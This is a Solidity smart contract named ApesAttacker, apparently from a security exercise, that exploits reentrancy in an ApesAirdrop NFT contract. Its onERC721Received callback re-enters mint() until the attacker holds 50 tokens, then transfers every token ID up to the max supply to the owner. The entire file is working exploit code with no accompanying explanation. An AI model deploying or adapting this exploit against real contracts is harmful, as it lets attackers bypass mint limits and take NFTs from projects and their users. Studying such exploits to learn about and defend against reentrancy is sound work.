// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./ApesAirdrop.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ApesAttacker is IERC721Receiver {
    ApesAirdrop apesAirdrop;
    address owner;

    constructor(address _apesAirdropAddress) {
        apesAirdrop = ApesAirdrop(_apesAirdropAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        apesAirdrop.mint();
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (apesAirdrop.balanceOf(address(this)) < 50) {
            apesAirdrop.mint();
        } else {
            for (uint256 i = 1; i <= apesAirdrop.maxSupply(); i++) {
                apesAirdrop.transferFrom(address(this), owner, i);
            }
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
